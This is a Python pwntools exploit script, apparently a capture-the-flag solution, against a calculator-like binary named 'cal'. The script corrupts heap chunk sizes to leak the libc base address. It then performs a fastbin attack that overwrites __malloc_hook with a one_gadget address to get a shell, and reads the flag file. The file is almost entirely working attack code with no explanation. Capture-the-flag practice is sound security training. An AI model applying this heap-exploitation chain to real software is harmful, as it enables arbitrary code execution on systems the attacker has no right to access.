from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./cal")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./cal")
else:
	p = remote(ip,port)
	libc = ELF("./libc.so.6")
	elf = ELF("./cal")

def line(info,size=False):
	p.sendlineafter("com:\n","1")
	p.sendafter("line\n",info)
	if size:
		p.sendlineafter("size:\n",str(size))
	

def index(index,new,delete):
	p.sendlineafter("com:\n","0")
	p.sendlineafter("index:\n",str(index))
	p.sendafter("new\n",new)
	p.sendafter("del:\n",delete)


code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}\nb *{b2}".format(b1=code_base+0x1BB8,b2=hex(code_base+0xE40)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
debugf()
size = 0x40
line('0="a"\n',size)
line('1="b"\n',size)
line('2="c"\n',size)
line('3="d"\n',size)
line('0=1#\n')
payload = "a"*size + p64(0) + p64(2*(size+0x10)+1)
line('0="{payload}"\n'.format(payload=payload),size)
line('1=1#\n')
line('4="eeeeeeee"#\n',size)
p.recvuntil("string eeeeeeee")
info = u64(p.recv(6).ljust(8,"\x00"))
libc.address = info - libc.symbols["__malloc_hook"] - 0x10 - 88- 0x90
log.success("libc_base:"+hex(libc.address))
line('3=#\n')

#debugf()
size = 0x60
line('5="f"\n',size)
line('6="g"\n',size)
line('6=1#\n')
line('5=1#\n')
payload = "a"*size + p64(0) + p64(size+0x10+1) + p64(libc.symbols["__malloc_hook"]-0x23)
line('5="{payload}"\n'.format(payload=payload),size)
line('6="g"\n',size)
one_gadget = libc.address + 0x4526a
log.success("one_gadget:"+hex(one_gadget))
payload = "a"*3 + p64(0) * 2 + p64(one_gadget)
line('7="{payload}\n"'.format(payload=payload),size)
line('8="a"',size)
if debug:
	p.sendline("cat flag")
else:
	p.sendline("cat flag")
print p.recvline()
#p.interactive()
